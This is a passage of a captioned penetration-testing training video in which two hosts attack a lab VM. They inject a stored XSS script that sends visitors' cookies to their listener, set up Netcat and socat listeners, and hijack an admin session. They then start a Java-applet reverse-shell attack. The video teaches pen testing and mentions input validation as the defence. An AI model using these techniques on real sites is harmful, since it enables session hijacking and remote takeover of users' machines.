00:18:36.332\nThere's my site.\n\n368\n00:18:36.332 --> 00:18:37.510\nThere's some comments.\n\n369\n00:18:37.510 --> 00:18:38.700\nExcellent!\n\n370\n00:18:38.700 --> 00:18:39.770\nWhat's this?\n\n371\n00:18:39.770 --> 00:18:40.460\nTesting.\n\n372\n00:18:40.460 --> 00:18:41.030\nRight.\n\n373\n00:18:41.030 --> 00:18:42.945\nSo, there we go,\nit's just goes to show you.\n\n374\n00:18:42.945 --> 00:18:46.900\nThis is just random user surfing that\nsite, and their browser executes.\n\n375\n00:18:46.900 --> 00:18:47.490\nSo hit OK.\n\n376\n00:18:47.490 --> 00:18:50.870\nNow that we know that\neverything is working,\n\n377\n00:18:50.870 --> 00:18:53.370\nlet's actually do some\nnasty to this thing.\n\n378\n00:18:53.370 --> 00:18:54.640\n&gt;&gt; Can we stop for just one second?\n\n379\n00:18:54.640 --> 00:18:56.010\n&gt;&gt; Sure.\n&gt;&gt; And think about what you just did\n\n380\n00:18:56.010 --> 00:19:00.440\ncuz that was pretty impressive and I don't\nknow if everybody really caught that.\n\n381\n00:19:00.440 --> 00:19:04.790\nI mean, all you did was\nwrite a little bit of HTML.\n\n382\n00:19:04.790 --> 00:19:09.590\nA little script block,\nin a comment field on a blog.\n\n383\n00:19:09.590 --> 00:19:12.297\nAnd then, somebody else goes and\nthat was it, right?\n\n384\n00:19:12.297 --> 00:19:15.090\nI mean, you just submitted your comment.\n\n385\n00:19:15.090 --> 00:19:18.210\nThere was no real hacking involved or\nanything.\n\n386\n00:19:18.210 --> 00:19:21.470\nAnother completely different\nuser goes to that website, and\n\n387\n00:19:21.470 --> 00:19:25.090\ntheir browser interprets that\ncomment that you submitted.\n\n388\n00:19:25.090 --> 00:19:29.010\nSees, it's a script block,\nI'm supposed to make a popup box.\n\n389\n00:19:29.010 --> 00:19:31.800\nAnd so that's a pretty benign\nlittle script you wrote,\n\n390\n00:19:31.800 --> 00:19:33.870\nbut think if that was something worse.\n\n391\n00:19:33.870 --> 00:19:35.840\nIt was that easy, scary stuff.\n\n392\n00:19:35.840 --> 00:19:38.260\n&gt;&gt; Yeah, it is pretty scary\nwhen you think about it.\n\n393\n00:19:38.260 --> 00:19:41.860\nTo just be able to type some\ncode into their text box and\n\n394\n00:19:41.860 --> 00:19:43.550\nhave it execute on other\npeople's browsers.\n\n395\n00:19:43.550 --> 00:19:45.880\nThat's why this is so dangerous.\n\n396\n00:19:45.880 --> 00:19:48.230\nAnd very cool for us to be able to do.\n\n397\n00:19:48.230 --> 00:19:48.770\n&gt;&gt; Yeah, as a pen tester.\n\n398\n00:19:48.770 --> 00:19:50.331\n&gt;&gt; Yeah, yeah.\n&gt;&gt; It's definitely fun.\n\n399\n00:19:50.331 --> 00:19:53.937\n&gt;&gt; Yeah, all right, so\nnow that we noticed it's guilty of this,\n\n400\n00:19:53.937 --> 00:19:55.648\nlet's make it do something.\n\n401\n00:19:55.648 --> 00:19:59.627\nSo what I'm gonna do is I'm gonna\nhave it send me the session ID of\n\n402\n00:19:59.627 --> 00:20:01.626\nthe user that visits that page.\n\n403\n00:20:01.626 --> 00:20:04.700\nThat's probably a bad thing for them.\n\n404\n00:20:04.700 --> 00:20:07.280\nBecause, once I get this session\nID I can hijack the session.\n\n405\n00:20:07.280 --> 00:20:08.850\nSo let's do that.\n\n406\n00:20:08.850 --> 00:20:12.770\nAnd to do that we will just type\nin a bit of some scripting here.\n\n407\n00:20:12.770 --> 00:20:16.730\nWe'll do it just kinda like we did before,\njust differently as far as like,\n\n408\n00:20:16.730 --> 00:20:17.980\nwhat's in the script.\n\n409\n00:20:17.980 --> 00:20:20.260\nSo I'm gonna say script, like so.\n\n410\n00:20:20.260 --> 00:20:25.392\nI'm gonna say new image, like that.\n\n411\n00:20:25.392 --> 00:20:30.014\nAnd .src, and that's \"=http:\\\\, and\n\n412\n00:20:30.014 --> 00:20:34.050\nI'm gonna give it my IP address, 46.\n\n413\n00:20:34.050 --> 00:20:35.940\nBecause guess what?\n\n414\n00:20:35.940 --> 00:20:40.040\nI'm running a listener waiting for\nthings to come back in on that.\n\n415\n00:20:40.040 --> 00:20:41.750\nHow about that?\n\n416\n00:20:41.750 --> 00:20:42.656\nSo I can do that and\n\n417\n00:20:42.656 --> 00:20:46.720\nI'm gonna give it a port 9999 cuz\nthat's where I'm gonna run my listener.\n\n418\n00:20:46.720 --> 00:20:49.473\nAnd then I can just say\nbogus.php like that,\n\n419\n00:20:49.473 --> 00:20:52.900\nbecause I want it to be\na kinda php output here.\n\n420\n00:20:52.900 --> 00:20:58.420\nAnd I will say outputs equals\n\n421\n00:20:58.420 --> 00:21:03.710\nplus document.cookie and\n\n422\n00:21:03.710 --> 00:21:08.940\nthen a semicolon, yeah.\n\n423\n00:21:08.940 --> 00:21:10.121\nAnd then close my script.\n\n424\n00:21:12.178 --> 00:21:12.870\nThere we go.\n\n425\n00:21:12.870 --> 00:21:18.540\nSo what I'm doing is, I'm telling, create\na new image that's part of the script.\n\n426\n00:21:18.540 --> 00:21:20.820\nBut get that image from this website.\n\n427\n00:21:21.820 --> 00:21:23.990\nThat's where the whole I gotcha.\n\n428\n00:21:23.990 --> 00:21:26.990\nHere, allow me to check from\nother websites for images.\n\n429\n00:21:26.990 --> 00:21:27.880\nOr at least I'm trying to.\n\n430\n00:21:27.880 --> 00:21:30.420\nAnd it's on this port,\nand this is where it's at.\n\n431\n00:21:30.420 --> 00:21:35.951\nAnd yeah, pipe that cookie over here,\nof anybody that visits this site.\n\n432\n00:21:35.951 --> 00:21:36.952\n&gt;&gt; [LAUGH]\n&gt;&gt; Anybody does that,\n\n433\n00:21:36.952 --> 00:21:38.990\ngive me their cookie.\n\n434\n00:21:38.990 --> 00:21:39.840\nAnd then we end our scripts.\n\n435\n00:21:39.840 --> 00:21:42.707\nSo now we can submit our query.\n\n436\n00:21:42.707 --> 00:21:45.170\nAnd we see, there's our testing box.\n\n437\n00:21:45.170 --> 00:21:47.450\nWe notice that we're getting a third\nbulletpoint, nothing really there.\n\n438\n00:21:47.450 --> 00:21:51.060\nAnd I got nothing here cuz we\nhaven't fired up our listener first.\n\n439\n00:21:51.060 --> 00:21:52.991\nAnd then we'll move on from there.\n\n440\n00:21:52.991 --> 00:21:55.330\nSo let me get close or just minimize.\n\n441\n00:21:56.550 --> 00:21:59.780\nLet me start our listener here.\n\n442\n00:21:59.780 --> 00:22:03.151\nSo ncap, or I'm sorry, nc for\n\n443\n00:22:03.151 --> 00:22:07.570\nNetcat -nvlp 9999 and hit return.\n\n444\n00:22:07.570 --> 00:22:10.670\nAnd now we're just waiting for\nsomeone to visit the website.\n\n445\n00:22:10.670 --> 00:22:15.420\nAs soon as someone does visit the website,\nit will capture that information and\n\n446\n00:22:15.420 --> 00:22:18.030\nthen close the connection,\ncuz this is Netcat.\n\n447\n00:22:18.030 --> 00:22:22.870\nNetcat is probably not the best resource\nfor doing this, even though it will do it.\n\n448\n00:22:22.870 --> 00:22:25.030\nIt's just not the best,\n\n449\n00:22:25.030 --> 00:22:29.820\nbecause as soon as it receives\ninformation and gets that, it'll close.\n\n450\n00:22:29.820 --> 00:22:33.290\nSo once the session is done,\nit'll drop the connection.\n\n451\n00:22:33.290 --> 00:22:38.470\nSo what we probably wanna\ndo is use a session\n\n452\n00:22:38.470 --> 00:22:40.460\nthat stays open and\nwe can use socat for that.\n\n453\n00:22:40.460 --> 00:22:41.570\nSo I'm gonna kill this listener.\n\n454\n00:22:42.990 --> 00:22:45.420\nAnd I think that I might have\ntyped in my string wrong,\n\n455\n00:22:45.420 --> 00:22:47.490\nbut we'll play with that in just a second.\n\n456\n00:22:47.490 --> 00:22:48.150\nLet's do it this way.\n\n457\n00:22:48.150 --> 00:22:51.680\nLet's try, actually I wrote it down,\nha ha, cuz I'm smart.\n\n458\n00:22:51.680 --> 00:22:53.240\nBrowser redirect, let me cap that.\n\n459\n00:22:53.240 --> 00:22:55.632\nI wrote these in so we can copy and paste\nit and make it a little bit easier so\n\n460\n00:22:55.632 --> 00:22:57.257\nyou don't have to watch\nme type things wrongly.\n\n461\n00:22:59.670 --> 00:23:02.873\nCuz I always fat finger something.\n\n462\n00:23:02.873 --> 00:23:06.420\nSo that is the one, no,\nthat's not the one we want.\n\n463\n00:23:06.420 --> 00:23:07.790\nThat's the browser reader.\n\n464\n00:23:07.790 --> 00:23:09.720\nWhere's the other one?\n\n465\n00:23:09.720 --> 00:23:10.540\nHijack session.\n\n466\n00:23:10.540 --> 00:23:11.630\nCat hijack session.\n\n467\n00:23:11.630 --> 00:23:12.930\nThere we go.\n\n468\n00:23:12.930 --> 00:23:13.630\nThat's what we want.\n\n469\n00:23:13.630 --> 00:23:19.840\nSo I'm just gonna copy this, Here.\n\n470\n00:23:19.840 --> 00:23:24.169\nWell, first we need to get\nour socat string going.\n\n471\n00:23:24.169 --> 00:23:25.707\nCat socat string, so there's your command.\n\n472\n00:23:25.707 --> 00:23:29.583\nSocat tcp -listen,\nthe port you wanna listen on.\n\n473\n00:23:30.938 --> 00:23:36.860\nAnd then what IP address and then to\nfork it, so that way, it stays open.\n\n474\n00:23:36.860 --> 00:23:38.188\nI'll paste that there.\n\n475\n00:23:38.188 --> 00:23:39.300\nSo, now that's listening.\n\n476\n00:23:40.960 --> 00:23:43.270\nIf anybody browses that site,\n\n477\n00:23:43.270 --> 00:23:45.968\nI can show you that by going over here and\nbrowsing to the site.\n\n478\n00:23:45.968 --> 00:23:48.955\nSo, I can go to My Blog.\n\n479\n00:23:48.955 --> 00:23:56.879\nI go into where The Welcome is,\nget our testing page.\n\n480\n00:23:56.879 --> 00:24:00.680\nAnd you'll see stuff is\nstarting to come in on there.\n\n481\n00:24:00.680 --> 00:24:03.260\nSo, there's definitely where you\ncan see that's the Windows NT.\n\n482\n00:24:03.260 --> 00:24:05.770\nStarting to gather great information here.\n\n483\n00:24:05.770 --> 00:24:12.050\nSo now, we're just waiting for\na good user, to actually go to that site.\n\n484\n00:24:12.050 --> 00:24:17.134\nAnd which is interesting now because\nthis is how this one works is this VM is\n\n485\n00:24:17.134 --> 00:24:22.549\nset up so that a automatic admin user\nactually visits the pages periodically.\n\n486\n00:24:22.549 --> 00:24:24.440\nSo that you can listen for these things.\n\n487\n00:24:24.440 --> 00:24:25.940\nSo that's part of the trick for this.\n\n488\n00:24:25.940 --> 00:24:28.280\nI don't see them coming in yet, so.\n\n489\n00:24:28.280 --> 00:24:33.800\nI know it happens once every 90 seconds,\nor something like that, so let me do this.\n\n490\n00:24:34.950 --> 00:24:44.010\nLet me reopen IceWeasel Let's go to where\nit says test and be the first to comment.\n\n491\n00:24:45.640 --> 00:24:48.840\nThen lets copy and paste because\nI'm sure I fat fingered something.\n\n492\n00:24:50.350 --> 00:24:50.999\n&gt;&gt; It looked good.\n\n493\n00:24:50.999 --> 00:24:53.380\n&gt;&gt; It did look good but\nI just like to be sure.\n\n494\n00:24:54.580 --> 00:24:57.880\nIt's easy enough done,\nwe'll just copy that string.\n\n495\n00:24:59.160 --> 00:25:00.310\nPut that guy in there.\n\n496\n00:25:02.080 --> 00:25:04.250\nPaste, and we'll submit query.\n\n497\n00:25:04.250 --> 00:25:06.240\nCuz I'm sure I just forgot a character or\nsomething.\n\n498\n00:25:08.380 --> 00:25:08.940\nThere we go.\n\n499\n00:25:08.940 --> 00:25:10.540\nAnd now we're waiting.\n\n500\n00:25:10.540 --> 00:25:14.840\nWe did get this Session ID\nfrom Firefox Ice weasel.\n\n501\n00:25:14.840 --> 00:25:16.130\nThat was me.\n\n502\n00:25:16.130 --> 00:25:16.940\nNow we're just waiting.\n\n503\n00:25:16.940 --> 00:25:19.142\nSo I know that that code is working.\n\n504\n00:25:19.142 --> 00:25:24.510\nI visited that site, it came into my\nlistener because we did the redirect, and\n\n505\n00:25:24.510 --> 00:25:29.250\nit did give me the session ID, cuz there\nis the session ID right there, you see it.\n\n506\n00:25:29.250 --> 00:25:33.290\nPHP session ID and\nthen the value of that is.\n\n507\n00:25:33.290 --> 00:25:35.930\nSo that's we're looking for\nfrom the admin themselves.\n\n508\n00:25:35.930 --> 00:25:39.770\nAs soon as that comes through, we should\nbe able to capture that information.\n\n509\n00:25:39.770 --> 00:25:42.350\nAnd then we're gonna use\ncookies manager plus\n\n510\n00:25:42.350 --> 00:25:46.142\nto inject that session\nID into our session ID.\n\n511\n00:25:46.142 --> 00:25:48.990\nAnd then that should give us\naccess to that admin area.\n\n512\n00:25:48.990 --> 00:25:52.106\nJust basically waiting for that to happen.\n\n513\n00:25:52.106 --> 00:25:54.960\n&gt;&gt; Larry Lewis out there in the chatroom\nbrings up a good point too.\n\n514\n00:25:54.960 --> 00:25:59.700\nYou could have it encode cookie data,\nto request remote server, and\n\n515\n00:25:59.700 --> 00:26:01.450\ngrab it from server access logs.\n\n516\n00:26:01.450 --> 00:26:04.670\nReally when it comes to this\ntype of cross scripting attack.\n\n517\n00:26:04.670 --> 00:26:06.519\nHow creative can you get?\n\n518\n00:26:08.250 --> 00:26:11.590\nIs really what you're\nlimited to most as far as\n\n519\n00:26:11.590 --> 00:26:14.880\nbeing able to manipulate their browser and\nwhat they're doing.\n\n520\n00:26:14.880 --> 00:26:18.670\nHaving them reach out and\ngrab an image from us is very creative.\n\n521\n00:26:18.670 --> 00:26:19.860\nI like that.\n\n522\n00:26:19.860 --> 00:26:21.300\n&gt;&gt; All right, so\nfinally the data is coming in.\n\n523\n00:26:21.300 --> 00:26:22.130\nThere it goes right there.\n\n524\n00:26:22.130 --> 00:26:24.950\nSo we got some, it took forever for\nthat script to run apparently.\n\n525\n00:26:26.140 --> 00:26:29.953\nThis is it right here, you see agent\nMozilla, Gecko, Phantom, Safari,\n\n526\n00:26:29.953 --> 00:26:31.233\nthat's not my browser.\n\n527\n00:26:31.233 --> 00:26:36.115\nThat's not my Windows browser, so\nthat must be our other user, or\n\n528\n00:26:36.115 --> 00:26:38.830\nanother random user, should I say.\n\n529\n00:26:38.830 --> 00:26:41.880\nLet's see what that does for\nus, let's copy, well,\n\n530\n00:26:41.880 --> 00:26:43.090\nI'll take the latest one to come in.\n\n531\n00:26:43.090 --> 00:26:47.170\nThere goes another one,\nlet's copy that session ID right there.\n\n532\n00:26:47.170 --> 00:26:51.430\nAll right, I'm gonna say Copy, all right,\nnow I'm gonna bring up IceWeasel again.\n\n533\n00:26:51.430 --> 00:26:54.520\nAnd this is where we're gonna\nemploy that Cookies Manager Plus.\n\n534\n00:26:54.520 --> 00:26:58.730\nSo I just go to Tools Go\nto Cookies Manager+.\n\n535\n00:26:58.730 --> 00:27:01.930\nAnd you put in the search field there,\n\n536\n00:27:01.930 --> 00:27:06.540\njust look for the IP or\nthe website name of your target.\n\n537\n00:27:06.540 --> 00:27:07.620\nSo that's come through.\n\n538\n00:27:07.620 --> 00:27:08.720\nI can hit that.\n\n539\n00:27:08.720 --> 00:27:12.579\nAnd then you get this lovely little\nedit button once you find that\n\n540\n00:27:12.579 --> 00:27:15.520\nPHPSES ID that you're looking for\nand hit edit.\n\n541\n00:27:15.520 --> 00:27:20.254\nI come right in here and\nit says content, delete that and\n\n542\n00:27:20.254 --> 00:27:25.660\npaste right over it, and\nnow hit save and hit close.\n\n543\n00:27:25.660 --> 00:27:30.740\nAnd now, when I hit admin,\nlook at that, I was not prompted for\n\n544\n00:27:30.740 --> 00:27:33.920\nuser name and\npassword because apparently I've stolen\n\n545\n00:27:33.920 --> 00:27:37.100\nthe session ID of\nthe administrator of this machine.\n\n546\n00:27:37.100 --> 00:27:38.570\nSo that's how that works.\n\n547\n00:27:38.570 --> 00:27:43.061\nYou can just keep that listener open,\nstart grabbing session IDs and then,\n\n548\n00:27:43.061 --> 00:27:47.353\ncopy and paste them in the cookies\nmanager plus and see if you get access.\n\n549\n00:27:47.353 --> 00:27:50.717\n&gt;&gt; Keep trying till you find one that\nactually gets you at the access level\n\n550\n00:27:50.717 --> 00:27:51.238\nyou need.\n\n551\n00:27:51.238 --> 00:27:52.551\n&gt;&gt; That's exactly what we're looking for.\n\n552\n00:27:52.551 --> 00:27:53.838\n&gt;&gt; What a great attack.\n\n553\n00:27:53.838 --> 00:27:56.380\nI'm just going to do this one,\ncouple lines of code.\n\n554\n00:27:56.380 --> 00:28:00.210\nAnd then we're just gonna sit back and\nwait for the admin to visit the site.\n\n555\n00:28:00.210 --> 00:28:02.007\n&gt;&gt; Yeah, [LAUGH] I know.\n\n556\n00:28:02.007 --> 00:28:05.020\nIt's kinda like there's some\nmore magic to this, right?\n\n557\n00:28:05.020 --> 00:28:09.250\nNo, it's that simple, you just have\nto finagle some things, right.\n\n558\n00:28:09.250 --> 00:28:12.980\nI told I'm able to put code in well,\nthis is the code I want you to do.\n\n559\n00:28:12.980 --> 00:28:16.890\nI want you to get an image, and\nthat image is actually you giving me.\n\n560\n00:28:16.890 --> 00:28:20.810\nThere was no image cuz I put bogus PHP,\nthere's nothing there, right.\n\n561\n00:28:20.810 --> 00:28:24.470\nBut while you're at that,\nwhy don't you go ahead and throw a session\n\n562\n00:28:24.470 --> 00:28:28.780\nthis way cuz I got a listener opened\nup receiving that data on said port.\n\n563\n00:28:28.780 --> 00:28:31.478\nSo very very dangerous,\nobviously, to allow them.\n\n564\n00:28:31.478 --> 00:28:35.990\nAllows me to do the browser redirection,\nget information about the end users.\n\n565\n00:28:35.990 --> 00:28:40.110\nAs well as grab the session ID so\nI can a session hijack.\n\n566\n00:28:40.110 --> 00:28:43.460\n&gt;&gt; And for the pen test ]and\nto make sure if we were doing\n\n567\n00:28:43.460 --> 00:28:47.360\nthe pen test when we're at an\norganization, we found this kind of thing,\n\n568\n00:28:47.360 --> 00:28:50.550\nhow do they keep themselves\nsafe from this type of attack?\n\n569\n00:28:50.550 --> 00:28:54.490\nAs then you mentioned you're sanitizing\ninput, doing input validation,\n\n570\n00:28:54.490 --> 00:28:58.400\nis there really any reason\nthey should be able to\n\n571\n00:28:58.400 --> 00:29:01.630\nuse script blocks in\nyour comment field right.\n\n572\n00:29:01.630 --> 00:29:05.600\nThis is why do we really need them\nto be able to type out HTTP code or\n\n573\n00:29:05.600 --> 00:29:08.180\nHTML code I should say\nin that comment box.\n\n574\n00:29:08.180 --> 00:29:10.830\nI don't think so in most cases.\n\n575\n00:29:10.830 --> 00:29:12.480\n&gt;&gt; No.\nBut a lot of people like to do that\n\n576\n00:29:12.480 --> 00:29:16.820\nbecause then you can put cool URL\npictures and gifs from other sites and\n\n577\n00:29:16.820 --> 00:29:18.580\njust copy and paste the code in there.\n\n578\n00:29:18.580 --> 00:29:20.330\nAnd it shows up.\nYou didn't have to do anything,\n\n579\n00:29:20.330 --> 00:29:21.850\nyou just grab a URL.\n\n580\n00:29:21.850 --> 00:29:22.710\n&gt;&gt; Because we all got to have our\n\n581\n00:29:22.710 --> 00:29:24.720\nanimated icons in our signatures-\n&gt;&gt; It's a must have.\n\n582\n00:29:24.720 --> 00:29:26.010\n&gt;&gt; Otherwise we're not cool.\n\n583\n00:29:26.010 --> 00:29:27.800\n&gt;&gt; That's we got out of the trees man.\n\n584\n00:29:27.800 --> 00:29:28.876\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n585\n00:29:28.876 --> 00:29:30.189\n&gt;&gt; All right, so let's move on,\n\n586\n00:29:30.189 --> 00:29:31.621\nnow that we know how to do that.\n\n587\n00:29:31.621 --> 00:29:33.536\nLet's talk about client side attacks.\n\n588\n00:29:33.536 --> 00:29:35.830\nLet's further this a little more.\n\n589\n00:29:35.830 --> 00:29:39.960\nNow that was pretty devastating I'm\nnow able to login as the administrator\n\n590\n00:29:39.960 --> 00:29:45.170\nof that site, make changes like I can\nadd remove and that's pretty cool but\n\n591\n00:29:45.170 --> 00:29:49.440\nit's not give me administrative\nremote shell cool, right?\n\n592\n00:29:49.440 --> 00:29:51.620\nThat's the biscuit you're looking for\nright.\n\n593\n00:29:51.620 --> 00:29:52.960\nSo lets go there.\n\n594\n00:29:52.960 --> 00:29:54.130\nThat's with a client side attack.\n\n595\n00:29:54.130 --> 00:29:57.100\nSo what we're going to do is use some\nof the techniques that we just learned\n\n596\n00:29:57.100 --> 00:30:01.410\nto execute a client-side attack where,\nnot only do they execute code, but they\n\n597\n00:30:01.410 --> 00:30:04.110\nexecute some seriously malicious juju,\n&gt;&gt; [LAUGH]\n\n598\n00:30:04.110 --> 00:30:05.910\n&gt;&gt; That gives me a reverse shell.\n\n599\n00:30:05.910 --> 00:30:08.000\nThat's, that's what we're looking for.\n\n600\n00:30:08.000 --> 00:30:09.690\nSo let's see here.\n\n601\n00:30:09.690 --> 00:30:11.790\nWe're going to use browser\nredirection inside of this.\n\n602\n00:30:11.790 --> 00:30:16.200\nAnd this is gonna heavily rely on\nour ability to socially engineer\n\n603\n00:30:16.200 --> 00:30:17.800\nour end user, right?\n\n604\n00:30:17.800 --> 00:30:21.110\nBecause this is not the easiest\nthing to accomplish.\n\n605\n00:30:21.110 --> 00:30:25.180\nBecause people nowadays are a lot more\nskeptical by nature, when it comes to\n\n606\n00:30:25.180 --> 00:30:28.840\nthings that are popping up on their site,\nor my browser's acting a little weird.\n\n607\n00:30:30.030 --> 00:30:32.660\nAnd they might call tech support, right?\n\n608\n00:30:32.660 --> 00:30:33.730\nOr they just might not do it at all.\n\n609\n00:30:33.730 --> 00:30:34.540\nThey'll call tech support and\n\n610\n00:30:34.540 --> 00:30:37.510\nsay I'm getting this prompt asking me\nto run this thing, should I do that?\n\n611\n00:30:37.510 --> 00:30:39.060\nAnd they're gonna go, no.\n\n612\n00:30:39.060 --> 00:30:41.670\nSo we're gonna have to\nsocially engineer the user so\n\n613\n00:30:41.670 --> 00:30:46.520\nthat they will allow, at least my type of\nattack, what I'm gonna show you, to work.\n\n614\n00:30:46.520 --> 00:30:48.450\nSome of them will run without\nuser intervention, but\n\n615\n00:30:48.450 --> 00:30:49.930\nthings get a little weird.\n\n616\n00:30:49.930 --> 00:30:52.010\nSo I went with this,\ncuz it's a whole lot nicer.\n\n617\n00:30:52.010 --> 00:30:56.590\nSo what I've done is I've created\na Java applet that basically\n\n618\n00:30:56.590 --> 00:31:00.110\nsays download this code and execute it.\n\n619\n00:31:00.110 --> 00:31:00.650\nOkay.\n\n620\n00:31:00.650 --> 00:31:01.360\nPretty simple.\n\n621\n00:31:01.360 --> 00:31:02.340\nWhat is that code?\n\n622\n00:31:02.340 --> 00:31:07.570\nThe code is runcmd.exe and\nthen fire up a listener or\n\n623\n00:31:07.570 --> 00:31:10.630\nI'm sorry,\nshovel your shelll back to my listener.\n\n624\n00:31:10.630 --> 00:31:11.480\nThat's what we're doing.\n\n625\n00:31:12.710 --> 00:31:13.260\n&gt;&gt; I like it.\n\n626\n00:31:13.260 --> 00:31:14.370\n&gt;&gt; It is fun.\n\n627\n00:31:14.370 --> 00:31:16.400\nExploit code runs one in the browser.\n\n628\n00:31:16.400 --> 00:31:18.303\nAgain, just like we do\nat cross-site scripting.\n\n629\n00:31:18.303 --> 00:31:21.330\nSo They kind of work together\nhand in hand like that.\n\n630\n00:31:21.330 --> 00:31:24.540\nThe pre-setup is we need to get some\ninformation about the targets and\n\n631\n00:31:24.540 --> 00:31:27.670\nthen we need to find a good exploit or\ncreate one ourselves.\n\n632\n00:31:27.670 --> 00:31:29.370\nSo let's take a look at that.\n\n633\n00:31:29.370 --> 00:31:32.070\nWe did see that coming in here.\n\n634\n00:31:32.070 --> 00:31:35.720\nAs this user, good thing I left that open,\nI'm glad I did cuz I'm just gonna\n\n635\n00:31:36.720 --> 00:31:41.490\ngo to that Sites, and\nthen you'll see this come through.\n\n636\n00:31:41.490 --> 00:31:47.184\nAnd you'll see right there, MSIE 8.0.\n\n637\n00:31:47.184 --> 00:31:48.757\nThat's good information right there.\n\n638\n00:31:48.757 --> 00:31:50.709\nAlso telling me Windows NT 6.1.\n\n639\n00:31:50.709 --> 00:31:54.977\nA lot of good Enumeration of that system,\nokay?\n\n640\n00:31:54.977 --> 00:31:57.990\nSo MSI 8.0 is great news,\nI can close this down,\n\n641\n00:31:57.990 --> 00:32:02.983\nthere's a cool thing that you have inside\nof your Kali system called SearchSploit.\n\n642\n00:32:02.983 --> 00:32:07.788\nSearchSploit like that and\nit has a database of exploits.\n\n643\n00:32:07.788 --> 00:32:11.371\nSo I can say Internet Explorer 8 and\n\n644\n00:32:11.371 --> 00:32:16.151\nthen I'll say remote,\nsomething like that and\n\n645\n00:32:16.151 --> 00:32:20.813\nit gives me a list of\nremote vulnerabilities,\n\n646\n00:32:20.813 --> 00:32:25.593\nthese guys right here with\nthat HTML on the end,\n\n647\n00:32:25.593 --> 00:32:29.370\nthose are these types of attacks.\n\n648\n00:32:29.370 --> 00:32:31.825\nSo you can go through them,\nfind one that you think might work.\n\n649\n00:32:31.825 --> 00:32:35.820\nYou're gonna probably have to modify\nthe code in there quite a bit,\n\n650\n00:32:35.820 --> 00:32:38.970\nif not just a little bit at least,\nso there goes that whole,\n\n651\n00:32:38.970 --> 00:32:42.780\nI have to have bit of programming\nbackground to understand what's going on\n\n652\n00:32:42.780 --> 00:32:46.100\nor you're gonna be doing a lot of\nGoogle searching figuring things out.\n\n653\n00:32:46.100 --> 00:32:49.450\nIt is frustration on a stick,\nbut it is part of the game.\n\n654\n00:32:49.450 --> 00:32:53.090\nSo if you don't have strong programming\nskills and you wanna get into pen testing\n\n655\n00:32:53.090 --> 00:32:57.940\nit is definitely a good idea to get\ncomfortable using at least some\n\n656\n00:32:57.940 --> 00:33:01.370\ntype of programming language, Java's a\ngreat one, it's easy to get your feet wet,\n\n657\n00:33:01.370 --> 00:33:05.260\nPython another one, Perl from\nback in the 90s was very popular,\n\n658\n00:33:05.260 --> 00:33:09.880\na lot of websites still run it,\nit's still out there so get that.\n\n659\n00:33:11.000 --> 00:33:12.490\nWhat I've done I've just written my own.\n\n660\n00:33:12.490 --> 00:33:16.210\nActually I kinda stole that code\nfrom something I found online.\n\n661\n00:33:16.210 --> 00:33:17.940\nI just looked for,\n\n662\n00:33:17.940 --> 00:33:23.135\nmake a Java applet that downloads code\nfrom a remote host and executes it.\n\n663\n00:33:23.135 --> 00:33:25.010\n&gt;&gt; [LAUGH]\n&gt;&gt; Lo and behold I found sites that showed\n\n664\n00:33:25.010 --> 00:33:26.510\nme how to do that and I did.\n\n665\n00:33:26.510 --> 00:33:30.020\nI took bits and pieces and put it all\ntogether and was able to do that.\n\n666\n00:33:30.020 --> 00:33:31.840\nI have self-signed this certificate.\n\n667\n00:33:33.060 --> 00:33:35.780\nSomething that Java does not like anymore.\n\n668\n00:33:35.780 --> 00:33:38.490\nSo you have to make an exception,\nbut we'll see.\n\n669\n00:33:38.490 --> 00:33:42.250\nLet's show you the social engineering\nside of it, and then the code side of it.\n\n670\n00:33:42.250 --> 00:33:45.870\nAnd see if it doesn't make a little\nmore sense than me trying to explain it.\n\n671\n00:33:45.870 --> 00:33:47.570\nSo, where we at?\n\n672\n00:33:47.570 --> 00:33:48.820\nWe gathered the information.\n\n673\n00:33:48.820 --> 00:33:51.608\nIt was the same place we stole\nthe session cookie stuff from.\n\n674\n00:33:51.608 --> 00:33:55.140\nLet's see here.\n\n675\n00:33:55.140 --> 00:33:57.930\nLook for or create a client side exploit.\n\n676\n00:33:57.930 --> 00:33:59.220\nWe talked about that.\n\n677\n00:33:59.220 --> 00:34:02.030\nNow, let's go ahead and\nopen up our Netcat listener, so\n\n678\n00:34:02.030 --> 00:34:04.990\nthat we can be ready for\nwhen this shell actually comes back.\n\n679\n00:34:04.990 --> 00:34:07.480\nSo I'm gonna just shrink my browser here.\n\n680\n00:34:07.480 --> 00:34:11.611\nGot this other one going,\nI don't need you real quickly.\n\n681\n00:34:11.611 --> 00:34:16.760\nI will say nc-mvlp and port.\n\n682\n00:34:16.760 --> 00:34:20.950\nOn this one, I went with port 443,\nbecause typically firewalls allow that,\n\n683\n00:34:20.950 --> 00:34:24.460\nbecause it's SSH and TSL, right.\n\n684\n00:34:24.460 --> 00:34:26.170\nSSl, TSL, whatever it is.\n\n685\n00:34:26.170 --> 00:34:26.940\nSSL.\nTSL.\n\n686\n00:34:26.940 --> 00:34:27.880\nThat's it.\n\n687\n00:34:27.880 --> 00:34:28.730\nTLS.\n\n688\n00:34:28.730 --> 00:34:30.750\nBoy, there's so many acronyms, Mike.\n\n689\n00:34:30.750 --> 00:34:31.370\nCan we get it right?\n\n690\n00:34:31.370 --> 00:34:31.970\nThere we go.\n\n691\n00:34:31.970 --> 00:34:33.200\nSo I just got my listener going.\n\n692\n00:34:33.200 --> 00:34:35.710\nSo when that shell pops,\nit's ready and waiting.\n\n693\n00:34:35.710 --> 00:34:40.050\nI'm not having to go back and\nbe Johnny-come-lately.\n\n694\n00:34:40.050 --> 00:34:42.830\nNow that that's done,\nwe have the code, we have that.\n\n695\n00:34:42.830 --> 00:34:45.940\nAll right,\nwe need to start the web service.\n\n696\n00:34:45.940 --> 00:34:48.070\nSo we will need a web service running.\n\n697\n00:34:48.070 --> 00:34:50.190\nI do have Apache on here running, and\n\n698\n00:34:50.190 --> 00:34:53.900\nI've put my exploit files in\nthe web root of my Apache server.\n\n699\n00:34:53.900 --> 00:34:58.267\nWe can take a look at that by doing a ls-,\nI'm sorry,\n\n700\n00:34:58.267 --> 00:35:05.190\n/var/www/html, there we go,\nand there's all my files.\n\n701\n00:35:05.190 --> 00:35:09.228\nThe one I've created is right, is that it?\n\n702\n00:35:09.228 --> 00:35:12.272\nNo, no, no, no, there it is,\nIE8 Attack, that's my guy.\n\n703\n00:35:12.272 --> 00:35:14.919\nYou can tell I've been playing\nwith this a little bit.\n\n704\n00:35:14.919 --> 00:35:17.843\nI've got so many different attacks\nthat I've thrown into this web server,\n\n705\n00:35:17.843 --> 